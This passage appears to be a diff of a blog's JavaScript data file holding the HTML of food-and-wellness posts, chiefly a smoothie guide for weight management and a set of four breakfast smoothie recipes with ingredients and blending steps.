+<p>While no single food can eliminate stress, a thoughtful combination of nutrient-dense ingredients can support overall well-being and help create a stronger foundation for physical and mental resilience. By consistently choosing wholesome foods and combining them with healthy lifestyle habits, you can take meaningful steps toward feeling more energized, focused, and balanced.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cortisol Reduction</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Stress Management</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Foods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Anti Stress Diet</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Nutrition Tips</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Lifestyle</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Wellness Foods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Balanced Living</span>
+</div>
+
+                `
+            },
+             {
+                id: 'the-second-post',
+                title: 'Fat Burning Smoothie Combos for Weight Loss (7-Day Plan Ideas)',
+                date: 'April 2, 2026',
+                image: './assets/smothies.png',
+                excerpt: 'Smoothies have become one of the most popular ways to support healthy eating goals, especially for those looking to boost energy, increase fruit and vegetable intake, and create satisfying meals that fit into a busy lifestyle. When thoughtfully prepared with nutrient-dense ingredients, smoothies can provide a balanced combination of vitamins, minerals, fiber, hydration, and protein that supports overall wellness.',
+                content: `
+                <p>Smoothies have become one of the most popular ways to support healthy eating goals, especially for those looking to boost energy, increase fruit and vegetable intake, and create satisfying meals that fit into a busy lifestyle. When thoughtfully prepared with nutrient-dense ingredients, smoothies can provide a balanced combination of vitamins, minerals, fiber, hydration, and protein that supports overall wellness.</p>
+<p>One of the biggest advantages of smoothie recipes is their flexibility. By combining fruits, vegetables, healthy fats, seeds, and quality liquids, you can create delicious blends tailored to your personal goals. Whether you're looking for a refreshing breakfast, a post-workout recovery drink, or a nutritious afternoon snack, the right smoothie ingredients can help keep you feeling energized and satisfied throughout the day.</p>
+
+<p>In this guide, we'll explore several nutrient-rich smoothie combinations that combine colorful produce, wholesome ingredients, and refreshing flavors. Along the way, you'll discover how each ingredient contributes to a balanced smoothie and how these combinations can fit into a healthy lifestyle focused on wellness, weight management, and sustainable nutrition.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Smoothies can be a convenient way to increase fruit and vegetable intake.</li>
+    <li>Combining fiber, protein, and healthy fats helps improve satiety.</li>
+    <li>Colorful ingredients provide valuable vitamins and antioxidants.</li>
+    <li>Hydrating ingredients can support overall wellness and recovery.</li>
+    <li>Balanced smoothies work best as part of a healthy lifestyle.</li>
+    <li>Whole-food ingredients often provide the most nutritional value.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Smoothies Are Popular for Healthy Living</h2>
+
+<p>Smoothies offer a simple way to pack multiple nutritious ingredients into a single meal or snack. Unlike highly processed beverages, homemade smoothies allow complete control over ingredient quality and portion sizes.</p>
+
+<p>Many people appreciate smoothies because they are quick to prepare, portable, and highly customizable. They can incorporate fruits, vegetables, seeds, dairy products, plant-based alternatives, and healthy fats while delivering refreshing flavors and appealing textures.</p>
+
+<p>A well-balanced smoothie can provide sustained energy, making it a practical option for busy mornings, pre-workout fuel, or post-exercise recovery.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Not all smoothies are created equal. The most effective smoothies for wellness and weight management focus on nutrient-dense ingredients rather than excessive added sugars, syrups, or sweetened flavorings.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Anatomy of a Balanced Smoothie</h2>
+
+<p>Before exploring specific smoothie combinations, it helps to understand what makes a smoothie satisfying and nutritious.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Fiber-Rich Fruits and Vegetables</h3>
+
+<p>Fiber supports digestion, helps create fullness, and contributes to overall health. Fruits such as bananas, berries, mangoes, grapefruit, oranges, and pineapple provide natural sweetness along with valuable nutrients.</p>
+
+<p>Vegetables like spinach and cucumber add volume, hydration, and nutrients without significantly increasing calories.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Protein Sources</h3>
+
+<p>Protein helps support muscle maintenance and contributes to satiety. Ingredients such as Greek yogurt can transform a smoothie into a more complete meal option.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Healthy Fats</h3>
+
+<p>Healthy fats from ingredients like avocado and chia seeds contribute to creaminess while helping promote satisfaction after meals.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Hydration Components</h3>
+
+<p>Water, green tea, cucumber, and unsweetened almond milk provide liquid while contributing additional hydration and flavor.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Green Boost Smoothie</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Ingredients</h3>
+
+<ul>
+<li>Spinach</li>
+<li>Banana</li>
+<li>Pineapple</li>
+<li>Cucumber</li>
+</ul>
+
+<p>This refreshing green smoothie combines leafy greens with naturally sweet fruits and hydrating vegetables. Spinach delivers vitamins and minerals while remaining mild in flavor. Banana contributes creaminess and natural sweetness, while pineapple adds a tropical twist.</p>
+
+<p>Cucumber enhances hydration and provides a refreshing finish that makes this smoothie particularly enjoyable during warmer months.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Why People Love It</h4>
+
+<p>The flavor remains light and approachable while still incorporating vegetables. It is an excellent introduction to green smoothies for beginners.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Berry Protein Smoothie</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Ingredients</h3>
+
+<ul>
+<li>Blueberries</li>
+<li>Greek yogurt</li>
+<li>Chia seeds</li>
+<li>Almond milk</li>
+</ul>
+
+<p>This smoothie focuses on nutrient density and balance. Blueberries provide antioxidants and natural sweetness, while Greek yogurt adds protein and a creamy texture.</p>
+
+<p>Chia seeds contribute fiber and healthy fats, helping create a smoothie that feels more filling than fruit-only blends. Almond milk helps blend everything together while keeping the drink light and refreshing.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> For extra texture and nutritional value, allow chia seeds to soak briefly before blending. This can create a smoother consistency and enhance satiety.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Tropical Fruit Smoothie</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Ingredients</h3>
+
+<ul>
+<li>Mango</li>
+<li>Banana</li>
+<li>Cucumber</li>
+<li>Pineapple</li>
+</ul>
+
+<p>Tropical flavors remain some of the most popular choices for smoothie enthusiasts. Mango and pineapple create a naturally sweet profile while banana contributes smoothness and body.</p>
+
+<p>Cucumber helps balance the sweetness and introduces a fresh element that prevents the smoothie from feeling overly heavy.</p>
+
+<p>The result is a vibrant blend that tastes like a tropical getaway while delivering valuable nutrients from whole foods.</p>
+
+<div style="background:#f0f9ff;border:1px solid #bae6fd;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:10px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #38bdf8;">Expert Insight</h3>
+  <p style="margin:0;">Combining fruits with vegetables is one of the easiest ways to improve nutrient intake without dramatically changing flavor. Ingredients like spinach and cucumber blend seamlessly into many smoothie recipes.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Citrus Green Smoothie</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Ingredients</h3>
+
+<ul>
+<li>Orange</li>
+<li>Spinach</li>
+<li>Avocado</li>
+<li>Water</li>
+</ul>
+
+<p>This smoothie balances bright citrus flavors with creamy avocado and nutrient-rich greens. Oranges bring natural sweetness and vitamin C, while spinach contributes a broad range of micronutrients.</p>
+
+<p>Avocado creates a luxurious texture and adds healthy fats that can help improve satisfaction after drinking the smoothie.</p>
+
+<p>The simplicity of this blend makes it an excellent choice for those who prefer fresh, clean flavors.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Best Time to Enjoy</h4>
+
+<p>This smoothie works particularly well as a refreshing breakfast or midday energy boost.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Citrus Ginger Wellness Smoothie</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Ingredients</h3>
+
+<ul>
+<li>Grapefruit</li>
+<li>Lemon</li>
+<li>Ginger</li>
+<li>Green tea</li>
+</ul>
+
+<p>This combination offers bold, refreshing flavors that stand out from traditional fruit smoothies. Grapefruit and lemon provide bright citrus notes, while ginger contributes a distinctive warming taste.</p>
+
+<p>Green tea serves as the liquid base, creating a light and refreshing blend that many people enjoy as part of an active lifestyle.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Smoothies designed for wellness goals should emphasize whole ingredients. Prioritizing fruits, vegetables, seeds, and minimally processed foods often delivers more nutritional value than relying on heavily sweetened alternatives.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Tips for Building Better Smoothies</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Focus on Whole Foods</h3>
+
+<p>Choose fresh or frozen fruits and vegetables whenever possible. Whole ingredients provide fiber and nutrients that may be missing from heavily processed alternatives.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Balance Sweetness Naturally</h3>
+
+<p>Rely on fruits like bananas, berries, mangoes, and pineapple instead of added sugars or syrups.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Include Protein and Fiber</h3>
+
+<p>Adding Greek yogurt, chia seeds, or other nutrient-dense ingredients can create a more satisfying smoothie.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Watch Portion Sizes</h3>
+
+<p>Even healthy smoothies should fit within your overall nutritional goals. Portion awareness helps maintain balance.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Keep frozen fruit on hand for convenience. Frozen ingredients create a thicker, colder smoothie while reducing the need for ice.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Supporting Weight Management with Smart Choices</h2>
+
+<p>Successful weight management typically involves a combination of balanced nutrition, regular activity, adequate sleep, and sustainable habits. Smoothies can play a role when they are thoughtfully prepared with nutrient-rich ingredients that support fullness and provide lasting energy.</p>
+
+<p>Many people find that replacing highly processed snacks with balanced smoothies helps them increase fruit and vegetable consumption while maintaining dietary consistency.</p>
+
+<p>Rather than focusing solely on calorie reduction, prioritizing nutritional quality often leads to more sustainable results and a healthier relationship with food.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Lifestyle Habits That Complement Smoothie Nutrition</h2>
+
+<ol>
+<li>Stay hydrated throughout the day.</li>
+<li>Engage in regular physical activity.</li>
+<li>Prioritize quality sleep.</li>
+<li>Eat balanced meals alongside smoothies.</li>
+<li>Focus on consistency rather than perfection.</li>
+</ol>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Smoothies are most effective when they complement an overall healthy lifestyle. No single recipe can replace balanced nutrition, movement, and long-term healthy habits.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Points</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Combine fruits and vegetables for better nutrition.</li>
+    <li>Include protein-rich ingredients for satisfaction.</li>
+    <li>Choose whole-food ingredients whenever possible.</li>
+    <li>Use smoothies as part of a balanced eating plan.</li>
+    <li>Stay consistent with healthy daily habits.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>Smoothies remain one of the easiest and most enjoyable ways to incorporate nutritious ingredients into your daily routine. Whether you prefer a green vegetable blend, a berry-rich protein smoothie, a tropical fruit combination, a citrus-based refresher, or a ginger-infused wellness drink, the possibilities are nearly endless.</p>
+
+<p>The most successful smoothie recipes combine flavor, nutrition, and practicality. By focusing on fruits, vegetables, healthy fats, fiber, and protein, you can create satisfying blends that support energy, hydration, and overall wellness.</p>
+
+<p>With thoughtful ingredient choices and consistent healthy habits, smoothies can become a valuable part of a balanced lifestyle focused on long-term health and sustainable nutrition.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Smoothies</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Weight Loss Smoothies</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Fat Burning Drinks</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Smoothie Recipes</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Eating</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Nutrition Tips</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Energy Boosting Foods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Wellness Lifestyle</span>
+</div>
+
+                `
+            },
+            {
+                id: 'my-first-post',
+                title: '4 Healthy Smoothie Recipes for Easy Breakfasts',
+                date: 'April 2, 2026',
+                image: './assets/easy-smothies.png',
+                excerpt: 'Colorful smoothie ideas are one of the easiest ways to make healthy eating feel fun, fresh, and realistic. With bright fruit, creamy textures, simple ingredients, and quick prep, smoothies can turn a busy morning into something that feels nourishing instead of rushed.',
+                content: `
+                <p>Colorful smoothie ideas are one of the easiest ways to make healthy eating feel fun, fresh, and realistic. With bright fruit, creamy textures, simple ingredients, and quick prep, smoothies can turn a busy morning into something that feels nourishing instead of rushed. The best part is that you do not need complicated superfoods or a long grocery list to make them work. A handful of fruit, a creamy base, oats for body, and a few smart pairings can create a satisfying drink that looks beautiful and tastes refreshing.</p>
+
+<p>This guide focuses on four easy smoothie ideas inspired by a bright, fruit-forward smoothie concept: a green smoothie, a tropical mango smoothie, a blueberry banana smoothie, and a strawberry banana smoothie. Each one uses familiar ingredients, approachable combinations, and balanced flavors that make them perfect for breakfast, snack time, or a quick boost during the day.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Fruit smoothies are quick, colorful, and easy to customize for busy mornings.</li>
+    <li>Oats add thickness, gentle flavor, and a more satisfying texture.</li>
+    <li>Banana works well as a natural sweetener and creamy base in many smoothie recipes.</li>
+    <li>Green, tropical, berry, and strawberry smoothies each offer a different flavor profile.</li>
+    <li>Simple ingredient prep can make homemade smoothies faster than store-bought options.</li>
+    <li>Layering fruits and bases thoughtfully helps create better flavor, texture, and visual appeal.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Smoothies Are Perfect for Busy Mornings</h2>
+
+<p>Mornings can feel chaotic, especially when breakfast has to compete with work, school routines, errands, and everything else on the schedule. Smoothies solve that problem beautifully because they are fast, flexible, and easy to enjoy on the go. Instead of skipping breakfast or grabbing something that leaves you hungry an hour later, a thoughtfully blended smoothie can bring together fruit, oats, dairy or yogurt, and other simple ingredients in minutes.</p>
+
+<p>Another reason smoothies are so popular is their visual appeal. Bright green kiwi, golden mango, deep blueberries, and red strawberries make each smoothie feel vibrant before the first sip. This makes smoothies especially useful for anyone trying to build healthier habits. When food looks fresh and inviting, it becomes easier to stay consistent.</p>
+
+<p>Smoothies also make it simple to use ingredients you already have. A ripe banana, a handful of berries, a scoop of oats, and a splash of milk can quickly become a creamy breakfast. Frozen fruit works just as well, and in some cases even better, because it chills the drink and creates a thicker texture without extra ice.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> The most satisfying smoothies usually include three key elements: fruit for flavor, a creamy ingredient for texture, and a filling ingredient such as oats, yogurt, or milk. This simple structure helps create smoothies that taste good and feel more complete.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Basic Formula for an Easy Smoothie</h2>
+
+<p>A great smoothie does not need to be complicated. In fact, the easiest recipes are often the ones you will make again and again. The basic smoothie formula starts with fruit, then adds a liquid, a creamy or thickening ingredient, and optional extras for flavor or texture.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Start with a Fruit Base</h3>
+
+<p>Fruit gives a smoothie its main personality. Green apple and kiwi create a crisp, refreshing taste. Mango and pineapple make the flavor sunny and tropical. Blueberries bring a deeper berry flavor, while strawberries add sweetness and a classic breakfast feel. Banana is especially useful because it blends smoothly and helps sweeten the drink naturally.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Add Creaminess</h3>
+
+<p>Creaminess can come from banana, yogurt, milk, or a dairy-free alternative. Yogurt creates a rich, tangy smoothie, while milk makes the texture lighter and smoother. If you prefer a thicker smoothie, use frozen fruit or reduce the amount of liquid. If you like a drinkable smoothie, add more liquid gradually until it reaches the texture you want.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Use Oats for Texture and Staying Power</h3>
+
+<p>Oats are a smart addition because they blend well and give the smoothie more body. They also make the drink feel more like a breakfast instead of a light juice. Rolled oats are usually the easiest option for blending. For an ultra-smooth texture, let the oats soak in milk or yogurt for a few minutes before blending.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">4 Easy Smoothie Ideas to Try</h2>
+
+<p>These four smoothie ideas cover a range of flavors, from fresh and green to sweet and creamy. They are simple enough for everyday mornings but colorful enough to feel special. Each recipe can be adjusted based on what you have at home, whether you prefer dairy, dairy-free milk, fresh fruit, or frozen fruit.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. Green Glow Smoothie</h3>
+
+<p>The Green Glow smoothie is fresh, crisp, and energizing. It brings together green fruit and oats for a clean breakfast flavor that does not feel too heavy. Kiwi adds brightness, banana adds creaminess, green apple brings a refreshing tart note, and oats help thicken the blend.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Ingredients</h4>
+
+<ul>
+  <li>1 kiwi, peeled and sliced</li>
+  <li>1 banana, fresh or frozen</li>
+  <li>1 small green apple, chopped</li>
+  <li>2 to 3 tablespoons rolled oats</li>
+  <li>1 cup milk, oat milk, almond milk, or water</li>
+  <li>A handful of spinach, optional for extra green color</li>
+</ul>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">How to Make It</h4>
+
+<ol>
+  <li>Add the liquid to the blender first.</li>
+  <li>Add the oats, apple, kiwi, banana, and spinach if using.</li>
+  <li>Blend until smooth and creamy.</li>
+  <li>Taste and adjust with more liquid if needed.</li>
+</ol>
+
+<p>This smoothie is especially good for anyone who wants a green smoothie that still tastes fruity. The apple and kiwi keep the flavor bright, while the banana prevents the drink from becoming too sharp.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. Sunrise Mango Smoothie</h3>
+
+<p>The Sunrise Mango smoothie is bright, tropical, and cheerful. It is the kind of smoothie that feels like sunshine in a glass. Mango gives it a soft, sweet flavor, pineapple adds tangy freshness, apple keeps it crisp, and oats make it more satisfying.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Ingredients</h4>
+
+<ul>
+  <li>1 cup mango chunks, fresh or frozen</li>
+  <li>1/2 cup pineapple chunks</li>
+  <li>1/2 apple, chopped</li>
+  <li>2 to 3 tablespoons rolled oats</li>
+  <li>3/4 to 1 cup milk, coconut milk, or orange juice</li>
+  <li>Ice, optional if using fresh fruit</li>
+</ul>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">How to Make It</h4>
+
+<ol>
+  <li>Pour the liquid into the blender.</li>
+  <li>Add mango, pineapple, apple, and oats.</li>
+  <li>Blend until fully smooth.</li>
+  <li>Add more liquid for a lighter texture or more frozen mango for a thicker smoothie.</li>
+</ol>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Frozen mango is one of the easiest ways to create a thick, creamy smoothie without needing extra sweeteners. It blends into a naturally smooth texture and gives the drink a rich golden color.</p>
+
+<p>This smoothie works well for breakfast, but it is also a great afternoon option when you want something refreshing and naturally sweet. For a creamier version, use milk or coconut milk. For a brighter, juice-like version, use orange juice or a mix of juice and water.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. Blueberry Rush Smoothie</h3>
+
+<p>The Blueberry Rush smoothie has a creamy, berry-rich flavor with a soft purple-blue color that looks beautiful in a glass. Blueberries bring a deep fruit flavor, banana adds sweetness, yogurt creates creaminess, and oats make the smoothie feel more filling.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Ingredients</h4>
+
+<ul>
+  <li>1 cup blueberries, fresh or frozen</li>
+  <li>1 banana</li>
+  <li>1/2 cup plain or vanilla yogurt</li>
+  <li>2 tablespoons rolled oats</li>
+  <li>1/2 to 3/4 cup milk or almond milk</li>
+  <li>A small drizzle of honey, optional</li>
+</ul>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">How to Make It</h4>
+
+<ol>
+  <li>Add milk and yogurt to the blender.</li>
+  <li>Add blueberries, banana, and oats.</li>
+  <li>Blend until creamy and smooth.</li>
+  <li>Taste and add a little honey only if you want more sweetness.</li>
+</ol>
+
+<p>Blueberry smoothies are a classic because they feel rich without being complicated. The yogurt adds a smooth breakfast-style texture, while the banana balances the tartness of the berries. If using frozen blueberries, the smoothie will be thicker and colder. If using fresh blueberries, add a few ice cubes if you want a chilled result.</p>
+
+<div style="background:#f0f9ff;border:1px solid #bae6fd;border-radius:12px;padding:18px 20px;margin:28px 0;color:#0f172a;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+  <p style="margin:0;">For a smoother texture, blend oats with the liquid first for 10 to 15 seconds before adding fruit. This helps break down the oats more evenly and prevents a grainy finish.</p>
+</div>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4. Strawberry Cream Smoothie</h3>
+
+<p>The Strawberry Cream smoothie is sweet, simple, and familiar. Strawberries and banana are a favorite pairing because they create a soft, dessert-like flavor while still feeling fresh enough for breakfast. Oats add body, and milk brings everything together into a creamy blend.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Ingredients</h4>
+
+<ul>
+  <li>1 cup strawberries, fresh or frozen</li>
+  <li>1 banana</li>
+  <li>2 to 3 tablespoons rolled oats</li>
+  <li>3/4 to 1 cup milk or dairy-free milk</li>
+  <li>1/4 cup yogurt, optional for extra creaminess</li>
+  <li>A splash of vanilla, optional</li>
+</ul>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">How to Make It</h4>
+
+<ol>
+  <li>Add milk to the blender.</li>
+  <li>Add strawberries, banana, oats, and yogurt if using.</li>
+  <li>Blend until smooth and creamy.</li>
+  <li>Add vanilla for a softer, sweeter flavor if desired.</li>
+</ol>
+
+<p>This smoothie is a great choice for picky eaters or anyone who prefers familiar flavors. It is also easy to turn into a smoothie bowl by reducing the liquid and topping it with sliced fruit, oats, or granola.</p>
+
